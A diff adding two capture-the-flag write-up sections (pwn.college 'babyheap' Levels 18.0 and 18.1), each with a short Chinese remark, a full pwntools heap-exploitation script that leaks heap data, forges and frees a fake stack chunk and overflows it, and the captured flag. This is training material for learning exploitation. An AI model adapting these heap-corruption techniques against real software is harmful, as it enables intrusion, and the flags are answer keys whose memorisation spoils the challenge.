@@ -4166,3 +4166,299 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{I8R8BzpNtgq5LKv4UV3QhQYfU3h.dFTO0MDL5cTNxgzW}`]
+
+# Level 18.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Revisit a prior challenge, now with TCACHE safe-linking.
+
+## Write-up
+
+这题就出的不好了，根本没用上 safe-linking 。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level18.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", secret)
+
+
+def stack_free():
+    target.sendlineafter(b": ", b"stack_free")
+
+
+def stack_scanf(data):
+    target.sendlineafter(b": ", b"stack_scanf")
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+
+    puts(1)
+    target.recvuntil(b"Data: ")
+    pos = int.from_bytes(target.recvline().strip(), "little")
+
+    puts(0)
+    target.recvuntil(b"Data: ")
+    mangled = int.from_bytes(target.recvline().strip(), "little")
+
+    target.success(f"pos: {hex(pos)}")
+    target.success(f"mangled: {hex(mangled)}")
+
+    payload = flat(
+        b"A" * 0x30,
+        0,
+        0x401,
+    )
+
+    stack_scanf(payload)
+    stack_free()
+
+    raw_input("DEBUG")
+    malloc(0, 0x3F0)
+
+    payload = flat(
+        b"A" * 0xBB,
+        0,
+        0,
+    )
+    scanf(0, payload)
+    send_flag(flat(0, 0))
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{w9fBk2-OmoD0TO7dLtn3ypPp0RY.dJTO0MDL5cTNxgzW}`]
+
+# Level 18.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Revisit a prior challenge, now with TCACHE safe-linking.
+
+## Write-up
+
+参见 [Level 18.0](#level-180)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level18.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", secret)
+
+
+def stack_free():
+    target.sendlineafter(b": ", b"stack_free")
+
+
+def stack_scanf(data):
+    target.sendlineafter(b": ", b"stack_scanf")
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+
+    puts(1)
+    target.recvuntil(b"Data: ")
+    pos = int.from_bytes(target.recvline().strip(), "little")
+
+    puts(0)
+    target.recvuntil(b"Data: ")
+    mangled = int.from_bytes(target.recvline().strip(), "little")
+
+    target.success(f"pos: {hex(pos)}")
+    target.success(f"mangled: {hex(mangled)}")
+
+    payload = flat(
+        b"A" * 0x30,
+        0,
+        0x401,
+    )
+
+    stack_scanf(payload)
+    stack_free()
+
+    raw_input("DEBUG")
+    malloc(0, 0x3F0)
+
+    payload = flat(
+        b"A" * 0x80,
+        0,
+        0,
+    )
+    scanf(0, payload)
+    send_flag(flat(0, 0))
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{8b5lkMBpAAfr5wN2o6YrXmK9nLw.dNTO0MDL5cTNxgzW}`]
